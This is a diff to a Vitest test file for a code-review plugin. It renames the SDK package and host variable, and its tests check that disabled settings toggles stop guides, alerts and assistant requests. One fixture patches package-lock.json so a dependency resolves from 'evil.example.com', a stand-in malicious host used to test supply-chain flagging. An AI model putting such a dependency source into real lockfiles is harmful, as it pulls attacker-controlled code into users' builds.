@@ -18,7 +18,7 @@ vi.mock("./store-queue", async (original) => {
 });
 
 import { mkdtempSync, writeFileSync } from "node:fs";
-import { createFakePluginHost } from "@get-bb/plugin-sdk/testing";
+import { createFakePluginHost } from "@vesnalia/plugin-sdk/testing";
 import plugin from "../server";
 import { defaultPreferences } from "./preferences";
 import { defaultKnobs, type Knobs } from "../lib/knobs";
@@ -46,7 +46,7 @@ const T0 = Date.parse("2026-10-10T12:00:00Z");
 
 async function host() {
   const delivered: unknown[] = [];
-  const { bb, harness } = createFakePluginHost({ pluginId: "code-review-workspace", sdk: {
+  const { alia, harness } = createFakePluginHost({ pluginId: "code-review-workspace", sdk: {
     threads: { spawn: async () => ({ id: "worker" }), archive: async () => ({}), stop: async () => ({}), update: async () => ({}), send: async () => ({}),
       get: async () => ({ archivedAt: null, deletedAt: null, status: "idle" }) },
     projects: { defaultExecutionOptions: async () => ({ providerId: "codex", model: "gpt-6", reasoningLevel: "low", permissionMode: "auto" }) },
@@ -56,20 +56,20 @@ async function host() {
       return { accepted: true, id: "activity", duplicate: false, ok: true };
     } },
   } as any });
-  const store = testStore(bb);
+  const store = testStore(alia);
   await store.saveReview({ targetKey: "pr-1", kind: "pr", repo: "acme/web", number: 1, author: "alice", headSha: "sha1", status: "generating", createdAt: 1, projectId: "p1" });
   await store.setLifecycle("pr-1", { authorAssociation: "MEMBER", ownPr: false });
   await store.savePreferences({ ...defaultPreferences, knobs: allKnobsOff }, 0);
-  return { bb, harness, store, delivered };
+  return { alia, harness, store, delivered };
 }
 
 test("with every toggle off, a member's ready guide starts no assistant and alerts nothing", async () => {
-  const { bb, harness, store, delivered } = await host();
+  const { alia, harness, store, delivered } = await host();
   harness.inspection.sdk.stub("threads.wait", async () => {
     await store.saveGuide("pr-1", { title: "T", intent: "I", sections: [], unplacedFiles: [] });
     return { matched: true };
   });
-  await generateGuide(bb, store, "pr-1", "p1", { unattended: true });
+  await generateGuide(alia, store, "pr-1", "p1", { unattended: true });
   expect((await store.getReview("pr-1"))?.status).toBe("ready");
   expect(harness.inspection.sdk.callsTo("threads.spawn").map(([args]) => (args as any).title)).toEqual(["Generate guide: pr-1"]);
   // The automatic review is off, so nothing waits for a click either.
@@ -78,7 +78,7 @@ test("with every toggle off, a member's ready guide starts no assistant and aler
 });
 
 test("with every toggle off, a member's re-request on an out-of-date review starts nothing and alerts nothing", async () => {
-  const { bb, store, delivered } = await host();
+  const { alia, store, delivered } = await host();
   await store.setStatus("pr-1", "ready");
   vi.useFakeTimers({ toFake: ["Date"] });
   let now = T0;
@@ -98,7 +98,7 @@ test("with every toggle off, a member's re-request on an out-of-date review star
   };
   const actions: TurnActions = { prepare: vi.fn(async () => true), checkPushes: vi.fn(async () => true), checkFixes: vi.fn(async () => true), autoStart: vi.fn(async () => true), projectId: async () => "p1", becomePr: vi.fn(async () => "skipped" as const) };
   try {
-    const sync = createReviewSync(bb, store, vi.fn() as any, { github, actions, now: () => now });
+    const sync = createReviewSync(alia, store, vi.fn() as any, { github, actions, now: () => now });
     await sync.all();
     pr = { ...pr, headSha: "sha2", commits: ["sha1", "sha2"], requests: [{ at: T0 + 0.1 * HOUR, by: "alice", via: "user" }] };
     now = T0 + 0.2 * HOUR;
@@ -119,8 +119,8 @@ test("with every toggle off, a member's re-request on an out-of-date review star
 });
 
 test("with every toggle off, a review still submits", async () => {
-  const { bb, harness, store } = await host();
-  await plugin(bb);
+  const { alia, harness, store } = await host();
+  await plugin(alia);
   await store.setStatus("pr-1", "ready");
   await store.savePatch("pr-1", "diff --git a/a.ts b/a.ts\n--- a/a.ts\n+++ b/a.ts\n@@ -0,0 +1,2 @@\n+one\n+two\n");
   const { revision } = await harness.behavior.callRpc("getReviewBundle", { targetKey: "pr-1" }) as any;
@@ -153,8 +153,8 @@ test("with every toggle off, the assistant isn't asked what it didn't check", as
 });
 
 test("with every toggle off, list_review_files marks no test weakened and the assistant isn't asked to check one", async () => {
-  const { bb, harness, store } = await host();
-  await plugin(bb);
+  const { alia, harness, store } = await host();
+  await plugin(alia);
   await store.savePatch("pr-1", "diff --git a/a.test.ts b/a.test.ts\n--- a/a.test.ts\n+++ b/a.test.ts\n@@ -1,2 +1 @@\n-  expect(a).toBe(1);\n+it.skip(\"a\", () => {\n");
   await store.setAssistantThread("pr-1", "assistant");
   const listed = await harness.behavior.callAgentTool("list_review_files", { targetKey: "pr-1" }, { threadId: "assistant" });
@@ -165,8 +165,8 @@ test("with every toggle off, list_review_files marks no test weakened and the as
 });
 
 test("with every toggle off, list_review_files and a page's stub show a lockfile without its digest, the stub naming only a new host", async () => {
-  const { bb, harness, store } = await host();
-  await plugin(bb);
+  const { alia, harness, store } = await host();
+  await plugin(alia);
   await store.savePatch("pr-1", "diff --git a/package-lock.json b/package-lock.json\n--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1 +1,2 @@\n-    \"node_modules/a\": {\n+    \"node_modules/b\": {\n+      \"resolved\": \"https://evil.example.com/b.tgz\",\n");
   await store.setAssistantThread("pr-1", "assistant");
   const listed = JSON.stringify(await harness.behavior.callAgentTool("list_review_files", { targetKey: "pr-1" }, { threadId: "assistant" }));
@@ -179,8 +179,8 @@ test("with every toggle off, list_review_files and a page's stub show a lockfile
 });
 
 test("with Ask why off, a removal takes no reason, and neither the agent nor Settings sees one given while it was on", async () => {
-  const { bb, harness, store } = await host();
-  await plugin(bb);
+  const { alia, harness, store } = await host();
+  await plugin(alia);
   await store.setStatus("pr-1", "ready");
   await store.savePatch("pr-1", "diff --git a/a.ts b/a.ts\n--- a/a.ts\n+++ b/a.ts\n@@ -0,0 +1,2 @@\n+one\n+two\n");
   await store.setAssistantThread("pr-1", "assistant");
@@ -200,8 +200,8 @@ test("with Ask why off, a removal takes no reason, and neither the agent nor Set
 });
 
 test("with Move to summary off, a comment on an older diff stays put until it's edited or removed", async () => {
-  const { bb, harness, store } = await host();
-  await plugin(bb);
+  const { alia, harness, store } = await host();
+  await plugin(alia);
   await store.setStatus("pr-1", "ready");
   await store.savePatch("pr-1", "diff --git a/a.ts b/a.ts\n--- a/a.ts\n+++ b/a.ts\n@@ -0,0 +1,2 @@\n+one\n+two\n");
   await store.upsertDraftComment("pr-1", { file: "a.ts", line: 1, side: "RIGHT", body: "Why one?" });
@@ -212,14 +212,14 @@ test("with Move to summary off, a comment on an older diff stays put until it's 
 });
 
 test("with Stop a guide while it builds off, Stop is refused and the guide runs until it's done", async () => {
-  const { bb, harness, store } = await host();
-  await plugin(bb);
+  const { alia, harness, store } = await host();
+  await plugin(alia);
   let finish = async () => {};
   harness.inspection.sdk.stub("threads.wait", () => new Promise((resolve) => { finish = async () => {
     await store.saveGuide("pr-1", { title: "T", intent: "I", sections: [], unplacedFiles: [] });
     resolve({ matched: true });
   }; }));
-  const run = generateGuide(bb, store, "pr-1", "p1", { unattended: true });
+  const run = generateGuide(alia, store, "pr-1", "p1", { unattended: true });
   await vi.waitFor(() => expect(harness.inspection.sdk.callsTo("threads.wait")).toHaveLength(1));
   expect(await harness.behavior.callRpc("stopGuide", { targetKey: "pr-1" })).toMatchObject({ ok: false });
   expect((await store.getReview("pr-1"))?.status).toBe("generating");
@@ -229,8 +229,8 @@ test("with Stop a guide while it builds off, Stop is refused and the guide runs 
 });
 
 test("with Dig deeper on a chapter off, Dig deeper is refused and nothing reaches the assistant", async () => {
-  const { bb, harness, store } = await host();
-  await plugin(bb);
+  const { alia, harness, store } = await host();
+  await plugin(alia);
   await store.setStatus("pr-1", "ready");
   await store.savePatch("pr-1", "diff --git a/a.ts b/a.ts\n--- a/a.ts\n+++ b/a.ts\n@@ -0,0 +1,2 @@\n+one\n+two\n");
   await store.saveGuide("pr-1", { title: "T", intent: "I", unplacedFiles: [], sections: [{ id: "c1", title: "Parsing", overview: "O", risk: "high", focus: ["Check that it parses."], diffs: [{ file: "a.ts", summary: "S" }] }] });
@@ -241,14 +241,14 @@ test("with Dig deeper on a chapter off, Dig deeper is refused and nothing reache
 });
 
 test("with Comment on or ask about a failing check off, a check's log isn't read", async () => {
-  const { bb, harness } = await host();
-  await plugin(bb);
+  const { alia, harness } = await host();
+  await plugin(alia);
   expect(await harness.behavior.callRpc("getCheckLog", { targetKey: "pr-1", runId: 77 })).toEqual({ ok: false, error: "Asking about a failing check is off in Settings." });
 });
 
 test("with every toggle off, a local review whose code changed says nothing new", async () => {
-  const { bb, harness, store } = await host();
-  await plugin(bb);
+  const { alia, harness, store } = await host();
+  await plugin(alia);
   const cwd = await mkdtemp(join(tmpdir(), "code-review-workspace-"));
   try {
     for (const args of [["init", "-b", "main"], ["-c", "user.name=R", "-c", "user.email=r@example.invalid", "commit", "--allow-empty", "-m", "start"]]) expect((await runGit(args, { cwd })).code).toBe(0);
@@ -263,8 +263,8 @@ test("with every toggle off, a local review whose code changed says nothing new"
 });
 
 test("with every toggle off, a review a thread started offers no thread to send to and sends nothing", async () => {
-  const { bb, harness, store } = await host();
-  await plugin(bb);
+  const { alia, harness, store } = await host();
+  await plugin(alia);
   await store.setLifecycle("pr-1", { ownPr: true, sourceThreadId: "coder" });
   await store.upsertDraftComment("pr-1", { file: "a.ts", line: 1, side: "RIGHT", body: "Fix it." });
   expect(await harness.behavior.callRpc("getSourceThread", { targetKey: "pr-1" })).toEqual({ thread: null });
@@ -273,9 +273,9 @@ test("with every toggle off, a review a thread started offers no thread to send 
   expect(harness.inspection.sdk.callsTo("threads.send")).toHaveLength(0);
 });
 
-test("with every toggle off, agents in your threads get no bb review skill, and bb review lists nothing", async () => {
-  const { bb, harness } = createFakePluginHost({ pluginId: "code-review-workspace", agentSkillIds: ["code-review-workspace-generate", "code-review-workspace"] });
-  const store = await startPlugin(bb);
+test("with every toggle off, agents in your threads get no VesnALIA review skill, and VesnALIA review lists nothing", async () => {
+  const { alia, harness } = createFakePluginHost({ pluginId: "code-review-workspace", agentSkillIds: ["code-review-workspace-generate", "code-review-workspace"] });
+  const store = await startPlugin(alia);
   await store.savePreferences({ ...defaultPreferences, knobs: allKnobsOff }, 0);
   await store.saveReview({ targetKey: "pr-1", kind: "pr", repo: "acme/web", number: 1, title: "Cache rows", status: "ready", createdAt: 1, projectId: "p1" });
   const ordinary = { thread: { id: "mine", title: "Fix it", parentThreadId: null, sourceThreadId: null }, origin: { kind: null, pluginId: null } } as any;
@@ -294,8 +294,8 @@ test("with Read REVIEW.md off, read_pr_context reads the repo's other instructio
   writeFileSync(join(cwd, "a.ts"), "a");
   await repo("add", ".");
   await repo("commit", "-qm", "base");
-  const { bb, harness, store } = await host();
-  await plugin(bb);
+  const { alia, harness, store } = await host();
+  await plugin(alia);
   await store.saveReview({ targetKey: "ref-1", kind: "ref", gitRef: "main", cwd, status: "ready", createdAt: 1 });
   await store.savePatch("ref-1", "diff --git a/a.ts b/a.ts\n--- a/a.ts\n+++ b/a.ts\n@@ -1 +1 @@\n-a\n+b\n");
   await store.setAssistantThread("ref-1", "assistant");
